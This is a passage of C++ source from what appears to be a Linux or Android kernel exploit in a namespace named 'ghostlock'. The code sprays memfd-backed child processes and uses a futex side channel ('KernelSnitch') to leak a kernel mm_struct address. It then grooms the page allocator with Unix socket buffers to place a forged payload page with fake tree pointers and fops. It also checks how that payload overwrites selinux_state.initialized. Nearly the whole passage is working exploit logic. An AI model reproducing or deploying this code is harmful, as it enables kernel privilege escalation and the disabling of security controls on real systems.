            static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        /* The forked leak child borrows the shared mmap context through this
         * compatibility alias; the owner remains the only releaser. */
        auto clear_snitch_alias =
                make_scope_exit([]() noexcept { ks = nullptr; });
        ks = snitch.get();
        pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
                cpu_count, ms_since(&t_spray));

        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            pre_ctx.childs[i] = clone_child();
        }
        child_leak = ChildProcess(clone_leak_child());
        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
            post_ctx.childs[i] = clone_child();
        }

        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
        }
        session::g_exploit_session.heap.leak_memfd.reset(open_memfd(child_leak.get()));
        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
            post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
        }

        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            kill_child(pre_ctx.childs[i]);
        }
        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
            kill_child(post_ctx.childs[i]);
        }
        for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
            kill_child(spray_ctx.childs[i]);
        }
        pr_info("[spray] finding futex collisions... +%lldms\n",
                ms_since(&t_spray));
        {
            struct timespec t_wait;
            clock_gettime(CLOCK_MONOTONIC, &t_wait);
            const pid_t leak_pid = child_leak.get();
            int32_t leak_status = 0;
            pid_t wp = 0;
            long long last_beat = 0;
            for (;;) {
                wp = waitpid(leak_pid, &leak_status, WNOHANG);
                if (wp == leak_pid) {
                    child_leak.mark_reaped();
                    break;
                }
                if (wp < 0) {
                    pr_warning("waitpid leak child: %m\n");
                    child_leak.mark_reaped();
                    break;
                }
                long long waited = ms_since(&t_wait);
                uint32_t timeout_ms =
                        session::g_exploit_session.profile.execution()
                        ->heap_kernelsnitch_timeout_ms;
                if (static_cast<uint64_t>(waited) >= timeout_ms) {
                    pr_warning("leak child stuck >%ums, killing it\n", timeout_ms);
                    (void) child_leak.terminate_and_wait(SIGKILL);
                    break;
                }
                if (waited - last_beat >= 2000) {
                    size_t scan_done = ks->scan_done;
                    size_t scan_total = ks->total_futexes;
                    if (scan_done > scan_total) scan_done = scan_total;
                    size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
                    if (scan_id > static_cast<size_t>FUTEX_SZ) scan_id = static_cast<size_t>FUTEX_SZ;
                    pr_info("[spray]   still finding collisions (%llds) %zu%% "
                            "(futex 0x%zx/0x%zx)...\n",
                            waited / 1000,
                            scan_total ? scan_done * 100 / scan_total : 0,
                            scan_id, (size_t) FUTEX_SZ);
                    last_beat = waited;
                }
                usleep(50000);
            }
            if (wp == leak_pid &&
                (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
                pr_warning("leak child exit status=%d\n", leak_status);
            }
        }
        if (!snitch.has_collisions()) {
            pr_warning("[spray] futex collisions not found\n");
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        pr_info("[spray] futex collisions found +%lldms\n",
                ms_since(&t_spray));
        (void) snitch.scan();
        pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
                snitch.result(), ms_since(&t_spray));
        uintptr_t leaked = snitch.result();
        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
        leaked |= static_cast<uintptr_t>(0xf) << 56;
        (session::g_exploit_session.heap.current.last_mm_struct) = leaked;
        /* mm_structs live in the direct map */
        if (leaked == static_cast<uintptr_t>(-1) ||
            leaked < kernel::KERNELSNITCH_IDENTITY_START ||
            leaked >= kernel::g_direct_map_end) {
            pr_warning("KernelSnitch mm_struct leak failed\n");
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        uintptr_t base = leaked & ~(kernel::ORDER3_SIZE - 1);
        if (!prepare_skb_payload(base, request)) {
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
        session::g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
        int32_t sndbuf = 1 << 20;
        setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        int32_t reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
        if (reclaim_flags >= 0) {
            fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
        }
        std::array<int32_t, 2> pcp_shaping_sv{};
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv.data()));

        struct iovec iov{};
        iov.iov_base = skb_buf();
        iov.iov_len = kernel::SKB_SEND_SIZE;

        struct msghdr msg{};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            SYSCHK(close(pre_ctx.memfds[i]));
            pre_ctx.memfds[i] = -1;
        }
        for (size_t i = 0; i < post_ctx.childs.size() - 1; i++) {
            SYSCHK(close(post_ctx.memfds[i]));
            post_ctx.memfds[i] = -1;
        }
        for (size_t i = 0; i < spray_ctx.childs.size(); i += mm_objs_per_slab) {
            SYSCHK(close(spray_ctx.memfds[i]));
            spray_ctx.memfds[i] = -1;
        }

        SYSCHK(close(pcp_shaping_sv[0]));
        SYSCHK(close(pcp_shaping_sv[1]));
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        /* Reap the snitch child's memfd: closing it is what drops the
         * mm_struct reference the spray depends on (the previous SYSCHK_pr
         * expansion dropped the close call). */
        const int32_t leak_fd = session::g_exploit_session.heap.leak_memfd.release();
        if (close(leak_fd) != 0) {
            pr_error("SYSCHK(close(memfd_leak)): %m\n");
        }
        session::g_exploit_session.heap.leak_memfd.reset();
        for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
            errno = 0;
            ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
            if (sent <= 0) {
                break;
            }
        }
        pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
        snitch.reset();

        /* LOCAL DIAGNOSTIC (not for upstream): the post-payload reap burst is
         * where every recent run dies ("payload ready" is the last line the
         * streamer sees). Progress lines make the burst measurable: if the log
         * stops between two of them the death is inside child i's exit, and
         * which i tells us whether it is a fixed child or dice. */
        pr_info("[spray] reap burst start n=%zu +%lldms\n",
                prepare_ctx.childs.size(), ms_since(&t_spray));
        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
            SYSCHK(close(prepare_ctx.memfds[i]));
            prepare_ctx.memfds[i] = -1;
            kill_child(prepare_ctx.childs[i]);
            if ((i & 31) == 31) {
                pr_info("[spray] reap %zu/%zu +%lldms\n", i + 1,
                        prepare_ctx.childs.size(), ms_since(&t_spray));
            }
        }
        pr_info("[spray] reap burst done n=%zu +%lldms\n",
                prepare_ctx.childs.size(), ms_since(&t_spray));

        return base;
    }

    uintptr_t prepare_good_kernel_page(const memory::WriteRequest &request) {
        uint32_t max_attempts = session::g_exploit_session.profile.heap_prepare_max_attempts();
        struct timespec t_good;
        clock_gettime(CLOCK_MONOTONIC, &t_good);
        struct timespec deadline = t_good;
        uint64_t timeout_ns =
                static_cast<uint64_t>(session::g_exploit_session.profile.heap_prepare_timeout_ms()) * 1000000ULL;
        deadline.tv_sec += static_cast<time_t>(timeout_ns / 1000000000ULL);
        deadline.tv_nsec += static_cast<long>(timeout_ns % 1000000000ULL);
        if (deadline.tv_nsec >= 1000000000L) {
            deadline.tv_sec++;
            deadline.tv_nsec -= 1000000000L;
        }
        for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
            uintptr_t base = prepare_kernel_page(&request);
            if (base) {
                memory::PayloadWriteLayout layout = {
                    .parent = (session::g_exploit_session.heap.current.fake_parent),
                    .right = (session::g_exploit_session.heap.current.fake_right),
                    .left = (session::g_exploit_session.heap.current.fake_left),
                    .fops = (session::g_exploit_session.heap.current.fake_fops),
                };
                if (!payload_write_layout_matches_request(&request, &layout)) {
                    pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
                               request.preserve_child, layout.right);
                } else if (!payload_write_layout_accepts_page(&request, &layout)) {
                    pr_warning("page %016zx stores an even byte over "
                               "selinux_state.initialized; taking another\n", base);
                } else {
                    pr_info("prepare_kernel_page ok attempt=%u +%lldms\n", attempt,
                            ms_since(&t_good));
                    return base;
                }
            }
            struct timespec now;
            clock_gettime(CLOCK_MONOTONIC, &now);
            if (now.tv_sec > deadline.tv_sec ||
                (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
                pr_warning("prepare_kernel_page timeout after %u attempts\n", attempt);
                break;
            }
            pr_warning("prepare_kernel_page retry %u/%u +%lldms\n", attempt,
                       max_attempts, ms_since(&t_good));
        }
        return 0;
    }
} // namespace ghostlock::support
